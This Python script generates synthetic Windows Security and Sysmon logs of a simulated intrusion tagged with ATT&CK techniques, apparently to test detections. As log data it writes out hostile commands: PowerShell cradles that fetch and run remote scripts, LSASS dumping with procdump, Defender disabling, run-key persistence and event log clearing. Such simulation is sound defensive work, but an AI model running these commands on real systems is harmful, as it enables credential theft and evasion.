import json
import os
import random
from datetime import datetime, timedelta

OUTPUT_DIR = "logs"
os.makedirs(OUTPUT_DIR, exist_ok=True)


def random_time(base, max_offset_minutes=60):
    offset = random.randint(0, max_offset_minutes * 60)
    return (base + timedelta(seconds=offset)).isoformat() + "Z"


def generate_attack_logs():
    base_time = datetime(2024, 6, 15, 2, 30, 0)
    computer = "WORKSTATION-01"
    domain = "CORP"
    events = []

    # ── T1110.001 Password Guessing ───────────────────────────────────────────
    for i in range(15):
        events.append({
            "event_id": "4625",
            "timestamp": random_time(base_time, 5),
            "computer": computer,
            "channel": "Security",
            "data": {
                "TargetUserName": "Administrator",
                "TargetDomainName": domain,
                "FailureReason": "Unknown user name or bad password",
                "LogonType": "3",
                "IpAddress": "192.168.1.105",
                "IpPort": str(random.randint(49000, 65000)),
            }
        })

    # ── T1078 Valid Account (successful logon after brute force) ──────────────
    events.append({
        "event_id": "4624",
        "timestamp": random_time(base_time + timedelta(minutes=6), 1),
        "computer": computer,
        "channel": "Security",
        "data": {
            "TargetUserName": "Administrator",
            "TargetDomainName": domain,
            "LogonType": "3",
            "IpAddress": "192.168.1.105",
            "LogonProcessName": "NtLmSsp",
        }
    })

    # ── T1059.001 PowerShell execution ────────────────────────────────────────
    ps_commands = [
        "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.105/payload.ps1')",
        "powershell.exe -exec bypass -c \"Import-Module C:\\AtomicRedTeam\\invoke-atomicredteam\\Invoke-AtomicRedTeam.psd1\"",
        "powershell.exe -c \"Get-Process | Where-Object {$_.Name -eq 'lsass'}\"",
        "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true",
        "pwsh.exe -c \"[System.Reflection.Assembly]::LoadWithPartialName('System.Management.Automation')\"",
    ]

    for cmd in ps_commands:
        events.append({
            "event_id": "4688",
            "timestamp": random_time(base_time + timedelta(minutes=8), 10),
            "computer": computer,
            "channel": "Security",
            "data": {
                "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "CommandLine": cmd,
                "SubjectUserName": "Administrator",
                "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
            }
        })

    # ── T1082 System Discovery ────────────────────────────────────────────────
    discovery_cmds = [
        ("systeminfo", "C:\\Windows\\System32\\systeminfo.exe"),
        ("whoami /all", "C:\\Windows\\System32\\whoami.exe"),
        ("net user", "C:\\Windows\\System32\\net.exe"),
        ("hostname", "C:\\Windows\\System32\\hostname.exe"),
        ("ipconfig /all", "C:\\Windows\\System32\\ipconfig.exe"),
    ]

    for cmd, proc in discovery_cmds:
        events.append({
            "event_id": "1",
            "timestamp": random_time(base_time + timedelta(minutes=12), 5),
            "computer": computer,
            "channel": "Microsoft-Windows-Sysmon/Operational",
            "data": {
                "Image": proc,
                "CommandLine": cmd,
                "User": f"{domain}\\Administrator",
                "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "ProcessId": str(random.randint(1000, 9999)),
            }
        })

    # ── T1003.001 LSASS Memory Dump ───────────────────────────────────────────
    events.append({
        "event_id": "10",
        "timestamp": random_time(base_time + timedelta(minutes=18), 2),
        "computer": computer,
        "channel": "Microsoft-Windows-Sysmon/Operational",
        "data": {
            "SourceImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "TargetImage": "C:\\Windows\\System32\\lsass.exe",
            "GrantedAccess": "0x1010",
            "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll|C:\\Windows\\System32\\KERNELBASE.dll",
            "User": f"{domain}\\Administrator",
        }
    })

    events.append({
        "event_id": "4688",
        "timestamp": random_time(base_time + timedelta(minutes=19), 1),
        "computer": computer,
        "channel": "Security",
        "data": {
            "NewProcessName": "C:\\Tools\\procdump.exe",
            "CommandLine": "procdump.exe -ma lsass.exe lsass.dmp",
            "SubjectUserName": "Administrator",
            "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
        }
    })

    # ── T1053.005 Scheduled Task ──────────────────────────────────────────────
    events.append({
        "event_id": "4698",
        "timestamp": random_time(base_time + timedelta(minutes=22), 2),
        "computer": computer,
        "channel": "Security",
        "data": {
            "SubjectUserName": "Administrator",
            "TaskName": "\\Microsoft\\Windows\\WindowsUpdate\\UpdateCheck",
            "TaskContent": "<Actions><Exec><Command>powershell.exe</Command><Arguments>-NoP -W Hidden -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.105/stage2.ps1')</Arguments></Exec></Actions>",
        }
    })

    # ── T1562.001 Disable Defender ────────────────────────────────────────────
    events.append({
        "event_id": "13",
        "timestamp": random_time(base_time + timedelta(minutes=25), 2),
        "computer": computer,
        "channel": "Microsoft-Windows-Sysmon/Operational",
        "data": {
            "EventType": "SetValue",
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "TargetObject": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware",
            "Details": "DWORD (0x00000001)",
            "User": f"{domain}\\Administrator",
        }
    })

    events.append({
        "event_id": "4688",
        "timestamp": random_time(base_time + timedelta(minutes=25), 1),
        "computer": computer,
        "channel": "Security",
        "data": {
            "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true",
            "SubjectUserName": "Administrator",
        }
    })

    # ── T1021.002 Lateral Movement via SMB ────────────────────────────────────
    for target in ["192.168.1.110", "192.168.1.115"]:
        events.append({
            "event_id": "3",
            "timestamp": random_time(base_time + timedelta(minutes=30), 5),
            "computer": computer,
            "channel": "Microsoft-Windows-Sysmon/Operational",
            "data": {
                "Image": "C:\\Windows\\System32\\net.exe",
                "DestinationIp": target,
                "DestinationPort": "445",
                "User": f"{domain}\\Administrator",
                "Protocol": "tcp",
            }
        })

    events.append({
        "event_id": "4688",
        "timestamp": random_time(base_time + timedelta(minutes=31), 2),
        "computer": computer,
        "channel": "Security",
        "data": {
            "NewProcessName": "C:\\Windows\\System32\\net.exe",
            "CommandLine": "net use \\\\192.168.1.110\\C$ /user:Administrator Lab123!",
            "SubjectUserName": "Administrator",
        }
    })

    # ── T1547.001 Registry Run Key Persistence ────────────────────────────────
    events.append({
        "event_id": "13",
        "timestamp": random_time(base_time + timedelta(minutes=35), 2),
        "computer": computer,
        "channel": "Microsoft-Windows-Sysmon/Operational",
        "data": {
            "EventType": "SetValue",
            "Image": "C:\\Windows\\System32\\reg.exe",
            "TargetObject": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate",
            "Details": "C:\\Users\\Administrator\\AppData\\Roaming\\svchost.exe",
            "User": f"{domain}\\Administrator",
        }
    })

    # ── T1070.001 Event Log Clearing ──────────────────────────────────────────
    events.append({
        "event_id": "4688",
        "timestamp": random_time(base_time + timedelta(minutes=45), 2),
        "computer": computer,
        "channel": "Security",
        "data": {
            "NewProcessName": "C:\\Windows\\System32\\wevtutil.exe",
            "CommandLine": "wevtutil cl Security",
            "SubjectUserName": "Administrator",
        }
    })

    events.append({
        "event_id": "1102",
        "timestamp": random_time(base_time + timedelta(minutes=45), 1),
        "computer": computer,
        "channel": "Security",
        "data": {
            "SubjectUserName": "Administrator",
            "SubjectDomainName": domain,
            "Description": "The audit log was cleared",
        }
    })

    # ── Shuffle to simulate realistic mixed log order ─────────────────────────
    random.shuffle(events)

    # ── Save ──────────────────────────────────────────────────────────────────
    output_path = os.path.join(OUTPUT_DIR, "attack_simulation.json")
    with open(output_path, "w") as f:
        json.dump(events, f, indent=2)

    print(f"[+] Generated {len(events)} attack events → {output_path}")
    print(f"[+] Techniques simulated:")
    print(f"    T1110.001 — Password Guessing (15 failed logons)")
    print(f"    T1078     — Valid Account (successful logon)")
    print(f"    T1059.001 — PowerShell Execution (5 commands)")
    print(f"    T1082     — System Discovery (5 commands)")
    print(f"    T1003.001 — LSASS Memory Dump (procdump + process access)")
    print(f"    T1053.005 — Scheduled Task Persistence")
    print(f"    T1562.001 — Disable Windows Defender")
    print(f"    T1021.002 — Lateral Movement via SMB")
    print(f"    T1547.001 — Registry Run Key Persistence")
    print(f"    T1070.001 — Event Log Clearing")


if __name__ == "__main__":
    generate_attack_logs()